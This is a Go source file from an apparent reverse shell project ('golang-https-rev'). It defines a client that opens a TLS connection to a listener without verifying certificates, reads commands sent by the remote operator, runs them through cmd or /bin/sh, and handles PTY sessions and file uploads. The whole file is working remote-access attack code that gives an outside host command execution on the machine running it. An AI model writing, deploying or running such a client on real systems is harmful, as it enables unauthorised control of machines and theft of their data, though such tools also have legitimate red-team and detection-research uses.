package client

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang-https-rev/pkg/protocol"
)

// ReverseClient represents a reverse shell client that connects to a listener
// and handles command execution and file transfers.
type ReverseClient struct {
	target            string
	conn              *tls.Conn
	reader            *bufio.Reader
	writer            *bufio.Writer
	isConnected       bool
	currentUploadPath string
	uploadChunks      []string
	runningCmd        *exec.Cmd
	ptyFile           *os.File   // PTY file for shell
	ptyCmd            *exec.Cmd  // Command running in PTY
	inPtyMode         bool       // Whether currently in PTY mode
	ptyMutex          sync.Mutex // Protects PTY state
}

// NewReverseClient creates a new reverse shell client
func NewReverseClient(target string) *ReverseClient {
	return &ReverseClient{target: target}
}

// Connect establishes a TLS connection to the listener
func (rc *ReverseClient) Connect() error {
	conn, err := tls.Dial("tcp", rc.target, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}

	rc.conn = conn
	rc.reader = bufio.NewReader(conn)
	rc.writer = bufio.NewWriter(conn)
	rc.isConnected = true
	return nil
}

// IsConnected returns whether the client is currently connected
func (rc *ReverseClient) IsConnected() bool {
	return rc.isConnected
}

// Close closes the connection
func (rc *ReverseClient) Close() error {
	if rc.conn == nil {
		return nil
	}
	rc.isConnected = false
	return rc.conn.Close()
}

// ExecuteCommand executes a shell command and returns the output
func (rc *ReverseClient) ExecuteCommand(command string) string {
	output, err := executeShellCommand(command)
	if err != nil {
		return fmt.Sprintf("Error: %v\n", err)
	}
	return output
}

// executeShellCommand executes a shell command and returns the output
func executeShellCommand(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output)), err
	}
	return string(output), nil
}

// HandleCommands listens for commands and executes them
func (rc *ReverseClient) HandleCommands() error {
	var cmdBuffer strings.Builder

	for {
		// Set read deadline to allow graceful shutdown
		if rc.conn != nil {
			rc.conn.SetReadDeadline(time.Now().Add(protocol.ReadTimeout * time.Second))
		}
		line, err := rc.reader.ReadString('\n')
		if rc.conn != nil {
			rc.conn.SetReadDeadline(time.Time{})
		}

		cmdBuffer.WriteString(line)

		if errors.Is(err, bufio.ErrBufferFull) {
			// Command line exceeded buffer; keep accumulating until newline
			if cmdBuffer.Len() > protocol.MaxBufferSize {
				cmdBuffer.Reset()
			}
			continue
		}

		if err != nil {
			if err == io.EOF {
				return nil
			}
			if netErr, ok := err.(interface{ Timeout() bool }); ok && netErr.Timeout() {
				continue
			}
			return fmt.Errorf("read error: %w", err)
		}

		command := strings.TrimSpace(cmdBuffer.String())
		cmdBuffer.Reset()
		if command == "" {
			continue
		}

		// If in PTY mode, only handle PTY-specific commands
		if rc.inPtyMode {
			if command == protocol.CmdPtyExit {
				_ = rc.handlePtyExitCommand()
				continue
			}
			if strings.HasPrefix(command, protocol.CmdPtyData+" ") {
				if err := rc.handlePtyDataCommand(command); err != nil {
					log.Printf("Error handling PTY data: %v", err)
				}
				continue
			}
			if strings.HasPrefix(command, protocol.CmdPtyResize+" ") {
				if err := rc.handlePtyResizeCommand(command); err != nil {
					log.Printf("Error handling PTY resize: %v", err)
				}
				continue
			}
			// Ignore other commands in PTY mode
			continue
		}

		// Process command using extracted handler
		shouldContinue, err := rc.processCommand(command)
		if err != nil {
			log.Printf("Error processing command: %v", err)
			continue
		}
		if !shouldContinue {
			return nil
		}
	}
}
